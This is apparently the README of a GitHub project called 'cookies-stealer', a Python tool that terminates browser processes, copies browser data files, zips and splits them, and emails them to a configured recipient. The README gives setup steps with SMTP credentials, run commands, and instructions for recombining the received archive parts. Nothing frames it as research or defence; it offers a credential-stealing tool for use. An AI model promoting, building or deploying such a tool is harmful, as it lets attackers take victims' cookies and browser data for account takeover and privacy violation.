## 🔐 Explanation

This application is designed to extract browser data from the computer and send it via email. It terminates the browser processes, copies the data, compresses it into a ZIP file and splits the ZIP file into pieces if necessary. These pieces are then sent via email.

## Features

- Safely terminates browser processes.
- Copies data from specified browser file paths.
- Compresses data into a ZIP file and splits it into parts (20 MB each).
- Sends the ZIP file via email.
- Configurable email settings using a `.env` file.

## ⚙️ Setup

To run your project on your local machine, follow these steps:

### 🛠️ Requirements

- Python 3.x
- `psutil` - For managing system processes
- `shutil` - For file operations
- `zipfile` - For creating and managing ZIP files
- `smtplib` - For sending emails
- `python-dotenv` - For reading configuration from a `.env` file

### 🚀 Steps

1. **Clone this repository**: Open a terminal and run:


   ```bash
   git clone https://github.com/Uveys-Yakut/cookies-stealer.git
2. **Create a `.env` File**:


    ```bash
    EMAIL_HOST=smtp.gmail.com
    EMAIL_PORT=587
    EMAIL_ADDRESS=your-email@gmail.com
    EMAIL_PASSWORD=your-email-password
    EMAIL_TO=recipient-email@example.com
3. **Navigate to the Project Directory**: Install the required Python packages: 
   
   
   ```bash
   pip install -r requirements.txt
4. **Start the Application**: Run the application using:
   
   
   ```bash
   python main.py

## 🗃️ Combining ZIP File Parts

If the ZIP file was split into multiple parts, you will need to combine them before you can extract the contents. Follow these steps to combine the ZIP file parts:

1. **Download All Parts**: Ensure you have downloaded all parts of the ZIP file from the email. The parts should be named similarly to `cookies_stealer_240918-1937.zip.part1`, `cookies_stealer_240918-1937.zip.part2`, etc.

2. **Place All Parts in the Same Directory**: Move all downloaded ZIP file parts to the same directory on your computer.

3. **Combine the Parts**:

   - **Method 1: Using Command Prompt (cmd)**:
     1. Open Command Prompt (cmd).
     2. Navigate to the directory where the parts are located using the `cd` command.
     3. Use the following command to combine the parts:


        ```cmd
        copy /b cookies_stealer_240918-1937.zip.part1 + cookies_stealer_240918-1937.zip.part2 cookies_stealer_240918-1937.zip
        ```


         The `copy /b` command concatenates binary files (`/b` switch) into a single file. This method combines the parts into `cookies_stealer_240918-1937.zip`.

   - **Method 2: Using PowerShell**:
     1. Open PowerShell.
     2. Navigate to the directory where the parts are located using the `cd` command.
     3. Use the following command to combine the parts:


        ```powershell
        Get-Content -Path "cookies_stealer_240918-1937.zip.part1", "cookies_stealer_240918-1937.zip.part2" -Raw | Set-Content -Path "cookies_stealer_240918-1937.zip"
        ```


        The `Get-Content` cmdlet reads the contents of the specified files, and `Set-Content` writes the combined content to `cookies_stealer_240918-1937.zip`.



## 📜 License

This project is licensed under the [MIT License](LICENSE)

## 👥 Contributors

**Uveys** - Project Manager and Developer

## 📧 Contact

For questions and feedback, you can reach me via email: uveysyakut859188@protonmail.com
